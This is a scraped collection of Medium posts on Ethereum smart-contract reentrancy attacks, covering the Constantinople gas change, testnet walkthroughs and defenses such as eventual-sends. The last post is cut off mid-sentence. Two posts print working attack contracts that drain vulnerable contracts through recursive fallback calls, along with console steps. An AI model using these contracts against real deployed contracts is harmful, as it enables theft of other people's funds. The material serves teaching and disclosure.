[{"title": "Constantinople enables new Reentrancy Attack", "post_link": "https://medium.com/chainsecurity/constantinople-enables-new-reentrancy-attack-ace4088297d9?source=search_post---------0", "author_name": "ChainSecurity", "author_link": "https://medium.com/@chain_security", "publish_date": "2019-01-15", "last_modified_date": "2019-01-17", "readtime": "3.48", "claps": 3646, "voters": 300, "content": "Constantinople enables new Reentrancy AttackChainSecurityFollowJan 15 \u00b7 4 min readImage: Hagia Sophia. From Guillaume-Joseph Grelot, Relation nouvelle d\u2019un voyage de Constantinople (Paris: Pierre Rocolet, 1680).The upcoming Constantinople Upgrade for the ethereum network introduces cheaper gas cost for certain SSTORE operations. As an unwanted side effect, this enables reentrancy attacks when using address.transfer(...) or address.send(...) in Solidity smart contracts. Previously these functions were considered reentrancy-safe, which they aren\u2019t any longer.What\u2019s wrong with this code?Following is a short smart contract which is not vulnerable to an reentrancy attack before Constantinople, but vulnerable afterwards. You can find the full source code including the attacker contract on our GitHub: https://github.com/ChainSecurity/constantinople-reentrancyAn example for newly vulnerable code.This code is vulnerable in an unexpected way: It simulates a secure treasury sharing service. Two parties can jointly receive funds, decide on how to split them, and receive a payout if they agree*. An attacker will create such a pair with where the first address is the attacker contract listed below and the second address is any attacker account. For this pair the attacker will deposit some money.Attacker Contract listed as first address.The attacker will call the attack function on his own contract, so that the following events unfold within one transaction:The attacker sets the current split using updateSplit in order to make sure that the update later will be cheap. This is the effect of the Constatinople upgrade. The attacker sets the split in such a way that his first address (the contract) is supposed to receive all of the funds.The attacker contract calls the splitFunds function, which will perform the checks*, and send the full deposit of this pair to the contract using a transfer.From to the fallback function, the attacker updates the split again, this time assigning all funds to his second account.The execution of splitFunds continues and the full desposit is also transferred to the second attacker account.In short, the attacker just stole other people\u2019s ether out of the PaymentSharer contract and can continue to do so.Why is this attackable now?Before Constantinople, every storage operation would cost at least 5000 gas. This far exceeded the gas stipend of 2300 sent along when calling a contract usingtransfer or send.After Constantinople, storage operations which are changing \u201cdirty\u201d storage slots cost only 200 gas. To cause a storage slot to be dirty, it has to be changed during the ongoing transaction. As shown above, this can often be achieved by an attacker contract through calling some public function which changes the required variable. Afterwards, by causing the vulnerable contract to call the attacker contract e.g. with msg.sender.transfer(...) the attacker contract can use the 2300 gas stipend to manipulate the vulnerable contract\u2019s variable successfully.Certain preconditions have to be met to make a contract vulnerable:1. There must be a function A, in which a transfer/send is followed by a state-changing operation. This can sometimes be non-obvious, e.g. a second transfer or an interaction with another smart contract.2. There has to be a function B accessible from the attacker which (a) changes state and (b) whose state changes conflict with those of function A.3. Function B needs to be executable with less than 1600 gas(2300 gas stipend - 700 gas for the CALL).Is my smart contract vulnerable?To test if you are vulnerable:(a) check if there are any operations following a transfer event.(b) check if those operations change storage state, most often by assigning some storage variable. If you are calling another contract, e.g. a tokens transfer method, check which variables are modified. Make a list.(c) check if any other method accessible from non-admins in your contract uses one of these variables(d) check if these methods change storage state themselves(e) check if the method is below 2300 in gas, keeping in mind that SSTORE operations are potentially only 200 gas.If all of this is the case, it is likely that an attacker can cause your contract to get into an undesirable state. Overall, this is another reminder why the Checks-Effects-Interactions Pattern is so important.Are there vulnerable smart contracts out there?A scan of the main ethereum blockchain using the data available from eveem.org did not uncover vulnerable smart contracts. We are working together with members of the ethsecurity.org working group to expand this scan to the complex smart contracts which haven\u2019t been decompiled yet. Especially decentralized exchanges which frequently call ether transfer functions to untrusted accounts followed by state changes afterwards might be vulnerable. Our static analyzer at https://securify.chainsecurity.com can detect potential reentrancy attacks and we have open-sourced the relevant pattern on https://github.com/eth-sri/securify. Please keep in mind that a warning of an reentrancy attack is in many cases not exploitable, but needs careful analysis.ThanksSpecial thanks go out to Ralph Pichler for the initial discussions which highlighted this new attack vector.Without the work of Tomasz Kolinko on decompiling smart contracts using symbolic execution we wouldn\u2019t have been able to quickly scan most of Ethereums smart contracts. We will open-source the project as soon as all contracts have been secured.* During this part the contract would check for fresh signatures from both parties to avoid front-running and other issues. We omit this part for readability as it does not influence the actual attack.", "responses": 16, "tags": ["Ethereum", "Security", "Constantinople"]}, {"title": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack Contract", "post_link": "https://medium.com/@gus_tavo_guim/reentrancy-attack-on-smart-contracts-how-to-identify-the-exploitable-and-an-example-of-an-attack-4470a2d8dfe4?source=search_post---------1", "author_name": "Gustavo (Gus) Guimaraes", "author_link": "https://medium.com/@gus_tavo_guim", "publish_date": "2017-05-25", "last_modified_date": "2018-06-19", "readtime": "3.58", "claps": 1270, "voters": 202, "content": "Reentrancy Attack On Smart Contracts: How To Identify The Exploitable And An Example Of An Attack ContractGustavo (Gus) GuimaraesFollowMay 25, 2017 \u00b7 4 min readTo code smart contracts is certainly not a free picnic. A bug introduced in the code cost money and most likely not only your money but also other people\u2019s as well. The reality is that the Ethereum ecosystem is still in its infancy but growing and standards are being defined and redefined by the day so one need to be always updated and akin to smart contract security best practices.As a student of smart contract security, I have been on the look out for vulnerabilities in code. Recently the educators at Team B9lab informed me of this contract deployed to the testnet.pragma solidity ^0.4.8;contract HoneyPot {  mapping (address => uint) public balances;  function HoneyPot() payable {    put();  }  function put() payable {    balances[msg.sender] = msg.value;  }  function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }  function() {    throw;  }}The HoneyPot contract above originally contained 5 ether and was deliberately devised to be hacked. In this blog post I want to share with you how I attacked this contract and \u2018collected\u2019 most of its ether.The Vulnerable ContractThe purpose of the HoneyPot contract above is to keep a record of balances for each address that put() ether in it and allow these addresses to get() them later.Let\u2019s look at the most interesting parts of this contract:mapping (address => uint) public balances;The code above maps addresses to a value and store it in a public variable called balances . It allows to check the HoneyPot balance for a address.balances[0x675dbd6a9c17E15459eD31ADBc8d071A78B0BF60]The put() function below is where the storage of the ether value happens in the contract. Note that msg.sender here is the address from the sender of the transaction.function put() payable {    balances[msg.sender] = msg.value;  }This next function we find where the exploitable is. The purpose of this function is to let addresses to withdraw the value of ether they have in the HoneyPot balances.function get() {    if (!msg.sender.call.value(balances[msg.sender])()) {      throw;    }      balances[msg.sender] = 0;  }Where is the exploitable and how can someone attack this you ask? Check again these lines of code out:if (!msg.sender.call.value(balances[msg.sender])()) {      throw;}balances[msg.sender] = 0;HoneyPot contract sets the value of the address balance to zero only after checking if sending ether to msg.sender goes through.What if there is an AttackContract that tricks HoneyPot into thinking that it still has ether to withdraw before AttackContract balance is set to zero. This can be done in a recursive manner and the name for this is called reentrancy attack.Let\u2019s create one.Here is the full contract code. I will attempt my best to explain its parts.pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;  function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);  }  function kill () {    suicide(msg.sender);  }  function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }  function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }}The first few lines is basically assigning the solidity compiler to use with the contract. Then we import the HoneyPot contract which I put in a separate file. Note that HoneyPot is referenced throughout the HoneyPotCollect contract. And we set up the contract base which we call it HoneyPotCollect .pragma solidity ^0.4.8;import \"./HoneyPot.sol\";contract HoneyPotCollect {  HoneyPot public honeypot;...}Then we define the constructor function. This is the function that is called when HoneyPotCollect is created. Note that we pass an address to this function. This address will be the HoneyPot contract address.function HoneyPotCollect (address _honeypot) {    honeypot = HoneyPot(_honeypot);}Next function is a kill function. I want to withdraw ether from the HoneyPot contract to the HoneyPotCollect contract. However I want also to get the collected ether to an address I own. So I add a mechanism to destroy the HoneyPotCollect and send all ether containing in it to the address that calls the kill function.function kill () {  suicide(msg.sender);}The following function is the one that will set the reentrancy attack in motion. It puts some ether in HoneyPot and right after it gets it.function collect() payable {    honeypot.put.value(msg.value)();    honeypot.get();  }The payable term here tells the Ethereum Virtual Machine that it permits to receive ether. Invoke this function with also some ether.The last function is what is known as the fallback function. This unnamed function is called whenever the HoneyPotCollect contract receives ether.function () payable {    if (honeypot.balance >= msg.value) {      honeypot.get();    }  }This is where the reentrancy attack occur. Let\u2019s see how.The AttackAfter deploying HoneyPotCollect, call collect() and sending with it some ether.HoneyPot get() function sends ether to the address that called it only if this contract has any ether as balance. When HoneyPot sends ether to HoneyPotCollect the fallback function is triggered. If the HoneyPot balance is more than the value that it was sent to, the fallback function calls get() function once again and the cycle repeats.Recall that within the get()function the code that sets the balance to zero comes only after sending the transaction. This tricks the HoneyPot contract into sending money to the HoneyPotCollect address over and over and over until HoneyPot is depleted of almost all its ether.Try it yourself. I left 1 test ether in this contract so others could try it themselves. If you see no ether left there, then it is because someone already attacked it before you.I originally created this code for the HoneyPotAttackusing the Truffle framework. Here is the code in case you need it for reference. Enjoy!", "responses": 9, "tags": ["Ethereum", "Solidity", "Smart Contracts", "Reentrancy Attack", "Smart Contract Security"]}, {"title": "", "post_link": "https://medium.com/@socrates1024/in-my-opinion-this-isnt-any-different-than-reentrancy-at-least-the-way-i-used-it-when-first-53c0308a0289?source=search_post---------2", "author_name": "Andrew Miller", "author_link": "https://medium.com/@socrates1024", "publish_date": "2016-09-08", "last_modified_date": "2018-03-06", "readtime": "0.29", "claps": 0, "voters": 0, "content": "A security issue with Ethereum\u2019s Solidity language, not just the DAO1359Muneeb AliAndrew MillerFollowSep 8, 2016 \u00b7 1 min readIn my opinion, this isn\u2019t any different than \u201creentrancy\u201d, at least the way I used it when first pointing out this problem in 2014.MediumEdit descriptionblog.blockstack.orgWhen I illustrated this with an example, Solidity didn\u2019t exist and Serpent have \u201cfunctions.\u201d But my example was logically broken into different functions indicated with a command byte, and it involved different functions just like you explained. Reentrancy at the *contract* level is essential for the problem involving shared state.", "responses": 1, "tags": []}, {"title": "Preventing Reentrancy Attacks in Smart Contracts", "post_link": "https://medium.com/agoric/preventing-reentrancy-attacks-in-smart-contracts-3899bf837f23?source=search_post---------3", "author_name": "Kate Sills", "author_link": "https://medium.com/@katesills", "publish_date": "2019-01-28", "last_modified_date": "2019-11-07", "readtime": "7.15", "claps": 573, "voters": 57, "content": "Preventing Reentrancy Attacks in Smart ContractsKate SillsFollowJan 28 \u00b7 8 min readTLDR: Reentrancy attacks can be entirely prevented with eventual-sends. Eventual-sends (think JavaScript promises \u2014 promises actually come from eventual-sends!) allow you to call a function asynchronously and receive a promise, even if the function is on another machine, another blockchain, or another shard, making sharding and cross-chain contract communication much easier.Photo by Tim Gouw on UnsplashOn January 15th, a group of key stakeholders chose to halt the Ethereum \u201cConstantinople\u201d upgrade. It was only a day before Constantinople was supposed to take effect, but Chain Security had released a blog post that pointed out that the new reduced gas costs would bypass some previously \u201creliable\u201d defenses against reentrancy attacks. The Ethereum community worked quickly and transparently to postpone the upgrade so that more investigation could be done.We wanted to take this opportunity to bring attention to the class of problems that reentrancy attacks are part of, and how certain designs can eliminate the entire class of problems altogether.Interleaving HazardsEthereum\u2019s reentrancy attacks are just one part of a larger class of problems, called interleaving hazards. We might think that because Ethereum runs sequentially, it can\u2019t possibly have interleaving hazards. But surprisingly, even entirely sequential programs can have interleaving hazards.Here\u2019s an example[1] that is entirely synchronous and sequential, but has a major interleaving hazard. In this example, we have a bank account that we can deposit to and withdraw from:Whenever we do something that changes the balance, we want to update the state with our new balance and notify our listeners. We do this with a stateHolder:Let\u2019s say we have two listeners. One is a financial application that deposits to our account if our balance drops below a certain level:The other listener just displays our account balance on our dashboard webpage (we\u2019ll simulate this with a console.log \ud83d\ude03):Nothing to worry about here, right? Let\u2019s see what happens when we execute it. We add the listeners and withdraw $100 from our account:Our bank account starts off with a balance of $4000. Withdrawing $100 updates the balance to be $3900, and we notify our listeners of the new balance. The financeListener deposits $1000 in reaction to the news, making the balance $4,900. But, our website shows a balance of $3,900, the wrong balance! \ud83d\ude31Why does this happen? Here\u2019s the sequence of events:financeListener gets notified that the balance is $3,900 and deposits $1,000 in response.The deposit triggers a state change and starts the notification process again. Note that the webpageListener is still waiting to be notified about the first balance change from $4000 to $3900.financeListener gets notified that the balance is $4,900 and does nothing because the balance is over $4,000.webpageListener gets notified that the balance is $4,900, and displays $4,900.webpageListener finally gets notified that the balance is $3,900 and updates the webpage to display $3,900 \u2014 the wrong balance.We\u2019ve just shown that even entirely synchronous programs \u2014 programs that have nothing to do with smart contracts or cryptocurrencies \u2014 can still have major interleaving hazards.How can we eliminate interleaving hazards?A number of people have proposed solutions for interleaving hazards, but many of the proposed solutions have the following flaws:The solution is not robust (the solution fails if conditions change slightly)The solution doesn\u2019t solve all interleaving hazardsThe solution restricts functionality in a major wayLet\u2019s look at what people have proposed for Ethereum.Resource constraints as a defense against interleaving hazardsConsensys\u2019 \u201cRecommendations for Smart Contract Security in Solidity\u201d states the following:someAddress.send()and someAddress.transfer() are considered safe against reentrancy. While these methods still trigger code execution, the called contract is only given a stipend of 2,300 gas which is currently only enough to log an event\u2026 Using send() or transfer() will prevent reentrancy but it does so at the cost of being incompatible with any contract whose fallback function requires more than 2,300 gas.As we saw in the Constantinople upgrade, this defense fails if the gas required to change state is less than 2,300 gas. Over time, we would expect the required gas to change, as it did with the Constantinople update, so this is not a robust approach (flaw #1).Call external functions last, after any changes to state variables in your contractSolidity\u2019s documentation recommends the following:\u201cWrite your functions in a way that, for example, calls to external functions happen after any changes to state variables in your contract so your contract is not vulnerable to a reentrancy exploit.\u201dHowever, in the example above, all of the calls to the external listener functions in withdraw and deposit happen after the state change. Yet, there is still an interleaving hazard (flaw #2). Furthermore, we might want to call multiple external functions, which would be then be vulnerable to each other, making reasoning about vulnerabilities a huge mess.Don\u2019t Call Other ContractsEmin G\u00fcn Sirer suggests:do not perform external calls in contracts. If you do, ensure that they are the very last thing you do. If that\u2019s not possible, use mutexes to guard against reentrant calls. And use the mutexes in all of your functions, not just the ones that perform an external call.This is obviously a major restriction in functionality (flaw #3). If we can\u2019t call other contracts, we can\u2019t actually have composability. Furthermore, mutexes can result in deadlock and are not easily composable themselves.It\u2019s hard to avoid programming overcomplicated monoliths if none of your programs can talk to each other.\u2014 \u201cThe Art of Unix Programming\u201dWhat do we mean by composability and why do we want it?StackOverflow gives us an excellent explanation of composability:\u201cA simple example of composability is the Linux command line, where the pipe character lets you combine simple commands (ls, grep, cat, more, etc.) in a virtually unlimited number of ways, thereby \u201ccomposing\u201d a large number of complex behaviors from a small number of simpler primitives.There are several benefits to composability:More uniform behavior: As an example, by having a single command that implements \u201cshow results one page at a time\u201d (more) you get a degree of paging uniformity that would not be possible if every command were to implement their own mechanisms (and command line flags) to do paging.Less repeated implementation work (DRY): Instead of having umpteen different implementations of paging, there is just one that is used everywhere.More functionality for a given amount of implementation effort: The existing primitives can be combined to solve a much larger range of tasks than what would be the case if the same effort went into implementing monolithic, non-composable commands.\u201dThere are huge benefits to composability, but we haven\u2019t yet seen a smart contract platform that is able to easily compose contracts without interleaving hazards. This needs to change.What is the composable solution?We can solve interleaving hazards by using a concept called eventual-sends. An eventual-send allows you to call a function asynchronously, even if it\u2019s on another machine, another blockchain, or another shard. Essentially, an eventual-send is an asynchronous message that immediately returns an object (a promise) that represents the future result. As the 2015 (prior to the DAO attack) Least Authority security review of Ethereum pointed out, Ethereum is extremely vulnerable to reentrancy attacks and if Ethereum switched to eventual-sends, they would eliminate their reentrancy hazards entirely.You might have noticed that promises in JavaScript have a lot in common with eventual-sends. That\u2019s not a coincidence \u2014 promises in JavaScript are direct descendants of eventual-sends, and come from work by Dean Tribble and Mark S. Miller of Agoric. (There\u2019s a great video on the origin of promises that explains more).In the late 1990s, Mark S. Miller, Dan Bornstein, and others created the programming language E, which is an object-oriented programming language for secure distributed computing. E\u2019s interpretation and implementation of promises were a major contribution. E inherited concepts from Joule (Tribble, Miller, Hardy, & Krieger, 1995). Promises were even present in the Xanadu project back in 1988. More information on the history of promises can be found in the textbook Programming Models for Distributed Computation. Image courtesy of Prasad, Patil, and Miller.Let\u2019s use JavaScript promises to prevent the interleaving hazard in our example. What we want to do is turn any immediate calls between the bankAccount object and our listeners into asynchronous calls. Now our stateHolder will notify the listeners asynchronously:And we do the same thing to the deposit call in our financeListener:In our new version that includes promises, our display updates correctly, and we\u2019ve prevented our interleaving hazards!There is one major distinction between JavaScript promises and eventual-sends: eventual-sends, unlike JavaScript promises, can be used with remote objects. For example, with eventual-sends we can read a file on a remote machine (the \u2018~.\u2019 is syntactic sugar) [2]:ShardingIn addition to eliminating re-entrancy attacks such the DAO attack, eventual-sends allow you to compose contracts over shards and even over blockchains, because your execution model is already asynchronous. If we are going to scale and interoperate, the future for blockchain must be asynchronous.Limitations and TradeoffsThere are a few tradeoffs in choosing eventual-sends. For instance, debugging in an asynchronous environment is generally harder, but work has already been done to allow developers to browse the causal graph of events in an asynchronous environment.Another limitation is that asynchronous messages seem less efficient. As Vitalik Buterin has pointed out, interacting with another contract might require multiple rounds of messaging. However, eventual-sends make things easier by enabling promise pipelining [3]. An eventual-send gives you a promise that will resolve in the future, and you can do an eventual-send to that promise, thus composing functions and sending messages without having to wait for a response.Promise pipelining can substantially reduce the number of roundtripsConclusionAgoric smart contracts use eventual-sends which eliminate the entire class of interleaving hazards. Compared to other proposed solutions, eventual-sends are more robust, more composable, and enable much more functionality, including even enabling communication across shards and across blockchains.Thus, smart contract platforms *can* prevent reentrancy vulnerabilities. Instead of relying on fragile mechanisms such as gas restrictions, we need to scrap synchronous communication between smart contracts and use eventual-sends.Footnotes[1] This example comes from Chapter 13 of Mark S. Miller\u2019s thesis, Robust Composition: Towards a Unified Approach to Access Control and Concurrency Control, and was rewritten in JavaScript.[2] The JavaScript promises in this example are only the equivalent to an eventual send for local objects, and for promises to local objects. For remote objects, a different API is required. For instance, Kris Kowal\u2019s Q and Q-connection libraries allow for:Promise.resolve(listener).invoke(\u2018stateChanged\u2019, newState);which we can write using the syntactic sugar for eventual sends:listener~.stateChanged(newState);[3] Miller M.S., Tribble E.D., Shapiro J. (2005) Concurrency Among Strangers. In: De Nicola R., Sangiorgi D. (eds) Trustworthy Global Computing. TGC 2005. Lecture Notes in Computer Science, vol 3705. Springer, Berlin, Heidelberg", "responses": 2, "tags": ["Ethereum", "JavaScript", "Smart Contracts", "Programming"]}, {"title": "\u201cReentrancy Attack\u201d on a Smart Contract", "post_link": "https://medium.com/@JusDev1988/reentrancy-attack-on-a-smart-contract-677eae1300f2?source=search_post---------4", "author_name": "Devon Wesley", "author_link": "https://medium.com/@JusDev1988", "publish_date": "2017-10-14", "last_modified_date": "2018-06-17", "readtime": "7.28", "claps": 204, "voters": 30, "content": "\u201cReentrancy Attack\u201d on a Smart ContractDevon WesleyFollowOct 14, 2017 \u00b7 8 min readBugs in Solidity are costly, putting yourself and many others at risk, so its important to take precautions when writing and deploying smart contracts. We\u2019re going to explore one of those bugs, a recursive send exploit. We\u2019re going be going through a simplified reentrancy attack scenario using 2 smart contracts, a Victim and an Attacker contract.Prerequisites:Its expected that you have a basic understanding of the Ethereum Blockchain technologies and the programming language Solidity, a smart contract concept, which compiles down to EVM bytecode.If you don\u2019t know what Smart Contract\u2019s are or Solidity is, explore these links below:Simple Smart Contract overview.Introduction to Solidity.Im using a mac, apologies and forewarning\u2019s.2. NodeJS \u2014 is a JavaScript runtime built on Chrome\u2019s V8 JavaScript engine you\u2019ll need at least version 6.9.1.3. NPM packages:$ npm i -g ethereumjs-testrpcThe first package we install is ethereumjs-testrpc, which is a \u201cNodeJS based Ethereum client for testing and development\u201d. TestRPC is a private blockchain with its own genesis block, that has all the functionality of the live Ethereum blockchain.$ npm i -g truffleThe second package truffle, is a deployment and testing framework built to make contract deployment and management easier for the developer. We\u2019re going to use this framework for our deployment flow and the console that it provides, which is a NodeJS console with a couple of extra packages injected into it.Getting Started:We\u2019re going to run a few commands to scaffold out our project.$ mkdir reentrancy_attack$ cd reentrancy_attackThe commands above create our project folder and then changes to that project folder.$ truffle init$ rm -rf test/ contracts/ConvertLib.sol contracts/MetaCoin.sol$ touch contracts/Attacker.sol contracts/Victim.solThese commands are going to delete and create a couple files, the ones we\u2019re going to delete we will not need, they were created when we ran truffle init. The files we\u2019re creating are going to hold our contracts code that we will eventually be deploying.Victim\u2019s Contract:The contents below go inside of our Victim.sol file.This is the Victim contract with the reentrancy vulnerability. The withdraw function is where the vulnerability actually lies and inside the if statement the victim writes !msg.sender.call.value(transferAmt)() which is an external call. The external call problem:\u201cAvoid external calls when possible. Calls to untrusted contracts can introduce several unexpected risks or errors. External calls may execute malicious code in that contract or any other contract that it depends upon. As such, every external call should be treated as a potential security risk, and removed if possible.\u201d \u2014 Ethereum WikiThe withdraw function sends 1 ether to the msg.sender , which in this case is the attacker. The attacker should only be able to receive that 1 ether per call, but we\u2019ll see how an attacker is able to call the function more than once before it finishes, the recursive send exploit.We're only using the deposit() function to transfer some ether to the Victim contract. The contract starts with 0\u201dether on deployment, so we\u2019ll need to send the contract some ether so the attacker can swipe it (evil laugh).Attacker\u2019s Contract:The contents below go inside of our Attacker.sol file.This is the attackers contract code, they simply declare a contract called Attacker. The attacker declares a variable v (on line 6) and sets that variable to type Victim (you can use contracts as explicit types in Solidity). Then in our constructor function (on lines 11-13) we cast the deployed Victim contract\u2019s address to our Victim type and set that to be the v variable.Then we declare two functions:attack()function () payable {} (our fallback function)The attack() function calls the v.withdraw() method which calls the deployed Victim contracts withdraw method (see lines 5\u20138 on the Victim contract above).Once this happens, 1 ether is sent to the attacker using the withdraw method. In our case the 1 ether is sent to our Attacker contract, its all fine and dandy until the sent ether actually arrives at the malicious contract code. Thats when the second Attacker contract function is called, the fallback function.The fallback function is invoked every time ether is sent to the Attacker contracts address. The payable modifier is actually what allows the contract to receive ether. When ether is sent to the Attacker contract, the fallback function is ran (almost like a \u201cfishing net\u201d to catch all the ether that is sent to this contract) which in turn causes several steps to take place:The LogFallback event fires every time the fallback function is called. (more on events in this post)Then we have an if statement that just stops this function from running more than 10 times, this keeps the withdraw() call from running out of gas and having the stolen ether reverted.Then v.withdraw() is called again!!!Before the original call to v.withdraw() ever finishes it calls the v.withdraw() method again which continues to recursively call itself until the count meets the condition.Deployment Code:The contents below go inside of our 2_deploy_contracts.js file.Go ahead an delete the code that is in this file and replace it with the code above. The code above allows us to control the deployment flow of our 2 contracts, in two simple steps:So we deploy our Victim contract to the TestRPC blockchain.We wait for the results of that deployment.Once the deployment was successful we take that address of the freshly deployed Victim contract and create an instance of our Attacker contract with that address passed to the Attacker contract\u2019s constructor function.Now to the Console:You\u2019re going to want to have TestRPC running in the background so we can deploy our contracts to it.$ testrpc -u 0This will start up TestRPC with the first account in the web3.eth.accounts array unlocked to send ether to our Victim contract.Deploying our contracts:$ truffle compileThis command is going to create a build folder, compile the 2 contracts down to EVM bytecode and create the ABI for both contracts.$ truffle migrateThis command is what actually deploys our contracts to TestRPC. You should see your TestRPC log some block hashes and their transactions.$ truffle consoleRunning this command puts us in a NodeJS repl, where we have access to a couple of global variables that we can use (more on that here, needs link).Inside of the Truffle console:> acct1 = web3.eth.accounts[0]First we going to set a variable acct1, thats going to be equal to the first account in the web3.eth.accounts array. When starting TestRPC you get 10 accounts that are uploaded with 100 ether each. We going to be using this account to send money to our Victims contract.> Victim.deployed().then(contract => victim = contract)Here we are going to get our deployed Victim contract instance and set it to a variable victim. This allows us to interact with our deployed contract.> getBalance = web3.eth.getBalance> balanceInEth = address => web3.fromWei(getBalance(address).toString())Here we set up a helper method that will check the account balances in their ether denomination. When checking account balances with the normal web3.eth.getBalance(address) it gives you the results in Wei. Now we can check the balances of our Victim contract and our acct1 address (external account #1 from TestRPC) in ether.> balanceInEth(victim.address)\"0\"> balanceInEth(acct1)\"99.789101234\"After checking the balances, acct1 has a bunch of ether and the victim doesn\u2019t have any. Lets share some of that with our Victim.> options = { from: acct1, to: victim.address, value: web3.toWei(11, 'ether') }> victim.deposit.sendTransaction(options)\"very-long-transaction-hash-that-keeps-going\"The fact that we made a function deposit that was payable allows us to send money to our Victim contract. Now when we check the balances of our two accounts the changes are reflected.> balanceInEth(acct1)\"88.678910\"> balanceInEth(victim.address)\"11\"Now we can see that our acct1 balance has 11 less ether plus some gas expenses (senders pay transaction fees) and now the victim has 11 ether.Now for the Attack!!:> Attacker.deployed().then(contract => attacker = contract)Like before, we\u2019re getting our Attacker contract instance which allows us to access the methods that we defined when we originally deployed our Attacker contract. Now lets check the balance of this contract.> balanceInEth(attacker.address)\"0\"The attacker doesn\u2019t have any ether in their account. Lets change that.> attacker.attack()If the command runs correctly, you\u2019ll see similar logs like the ones below.The logs above represent the LogFallback events that we\u2019ve emitted and its strictly for feedback to show us the recursive calls. You should be able to see an array logs: [\u2026]. This shows us with a single attack() call, that we where able to call v.withdraw() 9 additional times along with our original call, BAD.Now lets check the balances of the parties involved.> balanceInEth(attacker.address)\"10\"Now the Attacker contracts balance has 10 ether.> balanceInEth(victim.address)\"1\"The Victim contracts balance is less than it was before, with an entire 10 ether gone, poof.What Happened?:Since we didn\u2019t implement code to block concurrent calls from happening in the withdraw function, the withdraw function can be called multiple times before the original invocation finishes. When using msg.sender.call.value(ethAmt)() an external call it puts you and your contract code at risk. External calls may execute malicious code resulting in you losing the control flow of the function call and potentially losing ether that the contract holds.Solutions:There are 3 solutions we could use to protect contract code from a \u201cReentrancy Attack\u201d, but only 2 apply to our situation because we are not keeping track of any balances (more on this in a sec):The first and simplest thing you could do is replace msg.sender.call.value(ethAmt)() with msg.sender.send(ethAmt) which also allows you to execute external code, but limits the gas stipend to 2,300 gas, which is only enough to log an event, but not launch an attack.We can also create a Mutex modifier which will lock the function, effectively blocking any additional calls while the withdraw function is already in use:3. The final solution which does not apply to our contracts, but its common enough and deserves a mention. Its called zeroing out which you set the attackers balance to 0 before the ether is even sent. This limits what they can withdraw from the contract to only what they have. It relies on the attacker having some sort of stake in the contract, which is good because you can set the limit in the withdraw function and check if the attacker is a stake holder.and if sending the ether fails for some reason just give it back.Conclusion:As you can see Solidity is like any other programming language but the same mistakes can be much more costly (literally). All writes in Ethereum cost some sort of gas and untracked bugs can cost you ether and some of that ether might not even be yours. So do your due diligence when writing these contracts. Be sure to take advantage of the tools available and the many Testnets in the world today. Feedback welcome and Thank you for your time.\u2014ETH: devonwesley.ethBTC: 1A4ygq9YrUsXabo5iF8PfxocGTGZrPzoXtLinkedin Twitter Github Email", "responses": 2, "tags": ["Ethereum", "Solidity", "Blockchain", "Cryptocurrency", "Decentralization"]}, {"title": "Constantinople Hard Fork Makes Us Rethink What Reentrancy Is", "post_link": "https://blog.smartdec.net/constantinople-hard-fork-makes-us-rethink-what-reentrancy-is-455716c53537?source=search_post---------5", "author_name": "Evgeny Marchenko", "author_link": "https://blog.smartdec.net/@emarchenko", "publish_date": "2019-01-16", "last_modified_date": "2019-01-17", "readtime": "3.51", "claps": 490, "voters": 20, "content": "Constantinople Hard Fork Makes Us Rethink What Reentrancy IsEvgeny MarchenkoFollowJan 16 \u00b7 4 min readPhoto by Adli Wahid on UnsplashConstantinople hard fork enabled new kind of reentrancy attack. However, this attack does not even violate Checks-Effects-Interactions pattern, which is considered to protect from reentrancy. Neither it does fit the traditional definition of reentrancy (some of them, there are more than one). In this article, I rethink what reentrancy actually is and what measures should be taken to protect code against it.What happenedEthereum was preparing for Constantinople hard fork when ChainSecurity team found a possibly critical issue in EIP-1283. With this optimization enabled transfer function provides just enough gas to change storage. Until now it was often considered effect-free, though that was never explicitly guaranteed. So, there can be live contracts that will become vulnerable to reentrancy attack after hardfork, even if they were perfectly safe at the time of deployment. Actually, at least one such contract has been found. Fortunately, it doesn\u2019t hold any valuable assets.What was considered reentrancyWhat was interesting in this story and mostly went unnoticed is that the actual example used by ChainSecurity is not a \u201ctraditional\u201d reentrancy issue. It has sly differences from the (in)famous DAO attack in the way how security assumptions of the contract are violated.But what is actually considered reentrancy today?We\u2019ve checked multiple resources about Solidity smart contracts security, including ConsenSys best practices, DASP Top 10, SWC Registry, and the list of known attacks by Sigma Prime.On the whole, one is recommended to check every external call in the contract\u2019s function and see if it can somehow change the state of the contract and thus break the function\u2019s logic. As a precaution one can finish all \u201cinternal work\u201d before making external calls or use reentrancy guard pattern.We\u2019ve also checked different security tools to see what they detect as possible reentrancy (Mythil, Slither, Securify, Manticore). They mostly look for external calls followed by storage changes and recommend following CEI pattern. Some tools only consider external calls with a non-zero value (DAO-style attacks).So effectively most developers have little help other than \u201cdon\u2019t write to storage after external calls\u201d.Improving code quality and why this definition is obsoleteSo, reentrancy is either defined too wide to be practical or is considered to be a subset of CEI pattern violations. In many cases, developers just follow CEI pattern and assume that the code is secure against reentrancy attack.However, ChainSecurity\u2019s example does not violate CEI pattern, nonetheless, the contract is vulnerable.I believe that reentrancy attack is a part of a wider class of issues that arise from the incorrect assumption\u201cthis external call does not introduce any side effect on my contract, so my function\u2019s execution will continue as expected\u201d.Check this example:Splitter contract is vulnerable to reentrancy attack. It allows anyone to deposit some ether and later send it to two addresses according to custom share. Unfortunately, Attacker can modify this share setting on-the-fly, thus actually withdrawing his deposit twice.The simplest fix would be to precalculate both sent values before first transfer so Attacker cannot influence \u201cinteraction\u201d part of function\u2019s body. Surprisingly, each of the two transfers is both \u201cinteraction\u201d (execution goes to another contract) and \u201ceffect\u201d (ether is transferred) in terms of CEI pattern. That makes me ask what else can be considered an \u201ceffect\u201d.Let me slightly modify the first example. So now EtherOrDollars contract allows a user to withdraw funds in form of either ether or US dollars based on their preferences. To withdraw dollars the contract emits special event(WithdrawDollars) so service can send fiat to the user:In this case, the emitted event was the \u201ceffect\u201c in terms of CEI. On the whole, almost anything can be an \u201ceffect\u201d, e.g. token transfer (which is actually another external call). So, check everything that goes after an external call carefully.Also, in this example, we read eth[msg.sender] twice assuming it won\u2019t change between the calls. Obviously, this is a bad code style, which lead to vulnerability. As a rule of thumb I recommend reading state variables before the first external call.ConclusionWe should 